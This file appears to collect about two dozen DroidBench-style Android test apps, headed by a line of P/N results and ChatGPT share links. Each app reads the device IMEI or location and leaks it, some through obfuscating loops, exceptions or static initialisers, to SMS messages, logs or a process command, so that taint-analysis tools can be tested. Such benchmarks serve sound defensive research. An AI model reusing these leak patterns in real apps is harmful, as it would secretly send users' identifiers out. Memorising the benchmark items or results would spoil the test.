@@ -1,0 +1,1018 @@
+[P,P,P,N,P,PP,P,P,P,P,P,P,P,P,P,P,P,P,N,PN,PN,PN,PN,--]: https://chat.openai.com/share/a7c2d283-fd5b-4e9c-a111-eb22d07cf71b
+https://chat.openai.com/share/40ac12e1-a510-45e0-b848-25cff4415ad8
+
+
+//1
+package edu.mit.clone;
+
+import java.util.LinkedList;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId();
+        LinkedList<String> list = new LinkedList<String>();
+        list.add(imei);
+
+        LinkedList<String> list2 = (LinkedList<String>)list.clone();
+
+        Log.i("DroidBench", list2.get(0));
+    }
+}
+
+```
+//2
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class Exceptions1 extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+
+		String imei = "";		
+		try {
+			TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+			imei = telephonyManager.getDeviceId();
+			throw new RuntimeException();
+		}
+		catch (RuntimeException ex) {
+			SmsManager sm = SmsManager.getDefault();
+			sm.sendTextMessage("+49 1234", null, imei, null, null);
+		}
+	}
+
+}
+
+```
+//3
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class Exceptions2 extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_exceptions2);
+
+		String imei = "";		
+		try {
+			TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+			imei = telephonyManager.getDeviceId(); 
+			int[] arr = new int[(int) Math.sqrt(49)];
+			if (arr[32] > 0)
+				imei = "";
+		}
+		catch (RuntimeException ex) {
+			SmsManager sm = SmsManager.getDefault();
+			sm.sendTextMessage("+49 1234", null, imei, null, null); }
+	}
+
+}
+//3
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class Exceptions2 extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_exceptions2);
+
+		String imei = "";		
+		try {
+			TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+			imei = telephonyManager.getDeviceId(); 
+			int[] arr = new int[(int) Math.sqrt(49)];
+			if (arr[32] > 0)
+				imei = "";
+		}
+		catch (RuntimeException ex) {
+			SmsManager sm = SmsManager.getDefault();
+			sm.sendTextMessage("+49 1234", null, imei, null, null); }
+	}
+
+}
+//4
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class Exceptions3 extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_exceptions3);
+
+		String imei = "";		
+		try {
+			TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+			imei = telephonyManager.getDeviceId(); 
+			int[] arr = new int[42];
+			if (arr[32] > 0)
+				imei = "";
+		}
+		catch (RuntimeException ex) {
+			SmsManager sm = SmsManager.getDefault();
+			sm.sendTextMessage("+49 1234", null, imei, null, null); 
+		}
+	}
+
+}
+
+```
+//5
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class Exceptions4 extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_exceptions4);
+
+		try {
+			TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+			String imei = telephonyManager.getDeviceId(); 
+			throw new RuntimeException(imei);
+		}
+		catch (RuntimeException ex) {
+			SmsManager sm = SmsManager.getDefault();
+			sm.sendTextMessage("+49 1234", null, ex.getMessage(), null, null); 
+		}
+	}
+
+}
+
+```
+//6
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.location.Criteria;
+import android.location.Location;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+
+
+public class FactoryMethods1 extends Activity {
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_multi_handlers1);
+		
+		Criteria crit = new Criteria();
+		crit.setAccuracy(Criteria.ACCURACY_FINE);
+        LocationManager locationManager = (LocationManager) 
+        		getSystemService(Context.LOCATION_SERVICE);
+        Location data = locationManager.getLastKnownLocation(locationManager.getBestProvider(crit, true));
+        
+    	Log.d("Latitude", "Latitude: " + data.getLatitude()); 
+    	Log.d("Longtitude", "Longtitude: " + data.getLongitude()); 
+	}
+	
+}
+
+```
+//7
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class LoopExample1 extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_loop_example1);
+        
+        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+		String imei = telephonyManager.getDeviceId();
+		
+		String obfuscated = "";
+		for(char c : imei.toCharArray())
+			obfuscated += c + "_";
+		
+		SmsManager sm = SmsManager.getDefault();
+
+		sm.sendTextMessage("+49 1234", null, obfuscated, null, null); 
+    }    
+}
+
+```
+//8
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class LoopExample2 extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_loop_example2);
+        
+        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+		String imei = telephonyManager.getDeviceId(); 
+		
+		String obfuscated = "";
+		for(int i = 0; i < 10; i++)
+			if(i == 9)
+				for(char c : imei.toCharArray())
+					obfuscated += c + "_";
+		
+		SmsManager sm = SmsManager.getDefault();
+
+		sm.sendTextMessage("+49 1234", null, obfuscated, null, null); 
+    }    
+}
+
+```
+//9
+package edu.mit.serialization;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId(); 
+        S s1 = new S(imei);
+
+        try {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(out);
+            oos.writeObject(s1);
+            oos.close();
+        
+            byte[] bytes = out.toByteArray(); 
+        
+            ByteArrayInputStream in = new ByteArrayInputStream(bytes);
+            ObjectInputStream iis = new ObjectInputStream(in);
+            S s2 = (S)iis.readObject();
+            iis.close();
+        
+            Log.i("DroidBench", s2.toString());
+        } catch (Exception e) {
+        }
+    }
+}
+
+class S implements Serializable {
+	
+    private static final long serialVersionUID = -1155152173616606359L;
+
+    private String message;
+	
+    public S(String message) {
+        this.message = message;
+    }
+		
+    public String toString() {
+        return message;
+    }
+}
+
+```
+//10
+package de.ecspride;
+
+import java.util.HashSet;
+import java.util.Set;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+		
+		
+		Set<String> phoneNumbers = new HashSet<String>();
+		phoneNumbers.add("+49 123456");
+		phoneNumbers.add("+49 654321");
+		phoneNumbers.add("+49 111111");
+		phoneNumbers.add("+49 222222");
+		phoneNumbers.add("+49 333333");
+		
+		int a = 22 + 11;
+		int b = 22 * 2 - 1 + a;
+		
+		String message = (a == b) ? "no taint" : telephonyManager.getDeviceId(); 
+		
+		sendSMS(phoneNumbers, message);		
+	}
+	
+	private void sendSMS(Set<String> numbers, String message){
+		SmsManager sm = SmsManager.getDefault();
+		
+		for(String number : numbers){
+			sm.sendTextMessage(number, null, message, null, null);
+		}
+	}
+}
+
+```
+//11
+package edu.mit.non_sink_argument_flow;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId();  
+        
+        try {
+            ProcessBuilder pb = new ProcessBuilder();
+            pb.command("cmd", imei);
+            pb.start();  
+        } catch (Exception e) {
+            
+        }
+    }
+}
+
+```
+//12
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends Activity {
+	public static String im;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        im = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); 
+		StaticInitClass1 s1 = new StaticInitClass1();
+	}
+
+	public static class StaticInitClass1{
+		static{
+			SmsManager sms = SmsManager.getDefault();
+	        sms.sendTextMessage("+49 1234", null, im, null, null);  
+		}
+		
+	}
+    
+}
+
+```
+//13
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends Activity {
+	public static String im;
+	public static Context c;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        c = this;
+		StaticInitClass1 s1 = new StaticInitClass1();
+		
+		SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, im, null, null);  
+	}
+
+	public static class StaticInitClass1{
+		static{
+	        im = ((TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+		}
+		
+	}
+    
+}
+
+```
+//14
+package edu.mit.clinit;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+    public static MainActivity v;
+    public String s;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+	v = this;
+	
+	super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+	
+        s = "";
+        Test t = new Test();	
+                
+        Log.i("DroidBench", s);  }
+}
+
+class Test {
+    static {
+	TelephonyManager mgr = (TelephonyManager) MainActivity.v.getSystemService(Activity.TELEPHONY_SERVICE);
+	MainActivity.v.s = mgr.getDeviceId();  
+    }    
+}
+
+```
+//15
+package edu.mit.string_formatter;
+
+import java.util.Formatter;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId(); 
+        StringBuffer buf = new StringBuffer();
+        
+        Formatter formatter = new Formatter(buf);
+        formatter.format("%s", imei);
+        formatter.close();
+        
+        Log.i("DroidBench", buf.toString()); 
+    }
+}
+
+```
+//16
+package edu.mit.pattern_matcher;
+
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId();
+
+	Pattern p = Pattern.compile("(.*)");
+	Matcher matcher = p.matcher(imei);
+
+	if (matcher.matches()) {
+	    String match = matcher.group(1);
+	    Log.i("DroidBench", match);
+	}
+    }
+}
+
+```
+//17
+package edu.mit.string_to_char;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId();  
+	char[] chars = new char[imei.length()];
+
+	imei.getChars(0, imei.length(), chars, 0);
+
+	String builtImei = "";
+	for (int i = 0; i < chars.length; i++) 
+	    builtImei += chars[i];
+                
+        Log.i("DroidBench", builtImei);  
+    }
+}
+
+```
+//18
+package edu.mit.outputstream;
+
+import java.io.ByteArrayOutputStream;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId();
+	byte[] bytes = imei.getBytes();
+	
+	ByteArrayOutputStream out = new ByteArrayOutputStream();
+	out.write(bytes, 0, bytes.length);
+	
+	String outString = out.toString();
+	
+        Log.i("DroidBench", outString);
+    }
+}
+
+```
+//19
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class UnreachableCode extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_unreachable_code);
+    }
+
+  	private void unreachable(){
+  		TelephonyManager tm =(TelephonyManager)getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
+  		String deviceid = tm.getDeviceId(); 
+  		
+  		Log.i("INFO", deviceid); 
+  	}
+    
+}
+
+```
+//20
+
+package de.ecspride;
+
+import android.util.Log;
+
+public class DataLeak extends NoDataLeak{
+	
+	public DataLeak(String data){
+		super(data);
+	}
+	
+	@Override
+	public void logData(){
+		Log.i("LOG", super.getData());
+	}
+}
+package de.ecspride;
+
+import android.util.Log;
+
+public class NoDataLeak {
+	private final String data;
+	
+	public NoDataLeak(String data){
+		this.data = data;
+	}
+	
+	public String getData(){
+		return data;
+	}
+	
+	public void logData(){
+		Log.i("LOG", data);
+	}
+}
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.view.View;
+
+
+public class VirtualDispatch1 extends Activity {
+
+	private String imei;
+	private int counter = 0;
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_virtual_dispatch1);
+		
+		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+	    imei = telephonyManager.getDeviceId(); 
+	}
+
+	public void clickButton(View view){
+		++counter;
+		
+		NoDataLeak data = null;
+		
+		if(counter%2 == 0)
+			data = new NoDataLeak("no leak");
+		else
+			data = new DataLeak(imei);
+		
+		data.logData();
+	}
+	
+
+}
+
+```
+//21
+
+package edu.mit.dynamic_dispatch;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        B.mgr = (TelephonyManager) this.getSystemService(Activity.TELEPHONY_SERVICE);       
+      
+        Test test1 = new Test();
+        Test test2 = new Test();
+        A b = new B();
+        A c = new C();
+
+        SmsManager smsmanager = SmsManager.getDefault();
+
+        smsmanager.sendTextMessage("+49 1234", null, test1.method(b), null, null); 
+        Log.i("DroidBench", test2.method(c)); 
+     }
+}
+
+class Test {
+    public String method(A a) {        
+        return a.f();  
+    }
+}
+
+class A {
+    public String f() {
+        return "untainted";
+    }
+}
+
+class B extends A {
+    public static TelephonyManager mgr;
+    public String f() {
+        return mgr.getDeviceId();
+    }
+}
+
+class C extends A {
+    public String f() {
+        return "not tainted";
+    }
+}
+
+```
+//22
+package de.ecspride;
+
+import android.os.Bundle;
+import android.support.v4.app.Fragment;
+import android.support.v7.app.ActionBarActivity;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.view.LayoutInflater;
+import android.view.Menu;
+import android.view.MenuItem;
+import android.view.View;
+import android.view.ViewGroup;
+
+public class MainActivity extends ActionBarActivity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+
+		if (savedInstanceState == null) {
+			getSupportFragmentManager().beginTransaction()
+					.add(R.id.container, new PlaceholderFragment()).commit();
+		}
+		
+		factoryTest();
+	}
+	
+	private void factoryTest() {
+		MyInterface myif = createInterfaceImplementation();
+		String data = myif.getString();
+		SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, data, null, null); 
+        
+        MyInterface foo = createOtherImplementation();
+        System.out.println(foo);
+	}
+
+	private MyInterface createOtherImplementation() {
+		return new A();
+	}
+
+	private MyInterface createInterfaceImplementation() {
+		return new B();
+	}
+
+	interface MyInterface {
+		String getString();
+	}
+	
+	class A implements MyInterface {
+
+		@Override
+		public String getString() {
+	        TelephonyManager mgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+	        return mgr.getDeviceId();	
+		}
+		
+	}
+	
+	class B implements MyInterface {
+
+		@Override
+		public String getString() {
+			return "constant";
+		}
+		
+	}
+	
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+
+		// Inflate the menu; this adds items to the action bar if it is present.
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+
+	@Override
+	public boolean onOptionsItemSelected(MenuItem item) {
+		// Handle action bar item clicks here. The action bar will
+		// automatically handle clicks on the Home/Up button, so long
+		// as you specify a parent activity in AndroidManifest.xml.
+		int id = item.getItemId();
+		if (id == R.id.action_settings) {
+			return true;
+		}
+		return super.onOptionsItemSelected(item);
+	}
+
+	/**
+	 * A placeholder fragment containing a simple view.
+	 */
+	public static class PlaceholderFragment extends Fragment {
+
+		public PlaceholderFragment() {
+		}
+
+		@Override
+		public View onCreateView(LayoutInflater inflater, ViewGroup container,
+				Bundle savedInstanceState) {
+			View rootView = inflater.inflate(R.layout.fragment_main, container,
+					false);
+			return rootView;
+		}
+	}
+
+}
+
+```
+//23
+package de.ecspride;
+
+import android.os.Bundle;
+import android.support.v4.app.Fragment;
+import android.support.v7.app.ActionBarActivity;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.view.LayoutInflater;
+import android.view.Menu;
+import android.view.MenuItem;
+import android.view.View;
+import android.view.ViewGroup;
+
+public class MainActivity extends ActionBarActivity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+
+		if (savedInstanceState == null) {
+			getSupportFragmentManager().beginTransaction()
+					.add(R.id.container, new PlaceholderFragment()).commit();
+		}
+		
+		factoryTest();
+	}
+	
+	private void factoryTest() {
+		MyInterface myif = createInterfaceImplementation();
+		String data = myif.getString();
+		SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, data, null, null); 
+        
+        MyInterface foo = createOtherImplementation();
+        System.out.println(foo);
+	}
+
+	private A createOtherImplementation() {
+		return new A();
+	}
+
+	private B createInterfaceImplementation() {
+		return new B();
+	}
+
+	interface MyInterface {
+		String getString();
+	}
+	
+	class A implements MyInterface {
+
+		@Override
+		public String getString() {
+	        TelephonyManager mgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+	        return mgr.getDeviceId();
+		}
+		
+	}
+	
+	class B implements MyInterface {
+
+		@Override
+		public String getString() {
+			return "constant";
+		}
+		
+	}
+	
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+
+
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+
+	@Override
+	public boolean onOptionsItemSelected(MenuItem item) {
+		
+		int id = item.getItemId();
+		if (id == R.id.action_settings) {
+			return true;
+		}
+		return super.onOptionsItemSelected(item);
+	}
+
+	/**
+	 * A placeholder fragment containing a simple view.
+	 */
+	public static class PlaceholderFragment extends Fragment {
+
+		public PlaceholderFragment() {
+		}
+
+		@Override
+		public View onCreateView(LayoutInflater inflater, ViewGroup container,
+				Bundle savedInstanceState) {
+			View rootView = inflater.inflate(R.layout.fragment_main, container,
+					false);
+			return rootView;
+		}
+	}
+
+}
+
+```
